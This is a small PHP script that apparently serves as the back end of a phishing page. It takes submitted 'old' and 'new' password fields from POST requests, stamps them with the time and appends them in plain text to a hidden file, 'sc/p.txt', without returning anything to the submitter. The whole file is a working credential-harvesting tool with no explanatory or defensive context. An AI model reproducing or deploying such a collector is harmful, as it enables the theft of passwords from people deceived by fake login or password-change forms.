<?php

  $R_ID = time();
  $text = $R_ID  . '::';

  if(isset($_POST['oP'])){
    $text .= 'op>>'.$_POST['oP'];
  }

  if(isset($_POST['nP'])){
    $text .= '<<np>>'. $_POST['nP'] . '<<';
  }

rFile($text);
exit();
function respone($data){
  header('Content-Type: application/json');
  echo json_encode($data);
}

function rFile($content){
    $FILE_PATH = './sc/p.txt';
    $content .= "\r\n";
    $myfile = fopen($FILE_PATH, 'a') or die("Unable to open file!");
    fwrite($myfile, $content);
    fclose($myfile);
}


?>
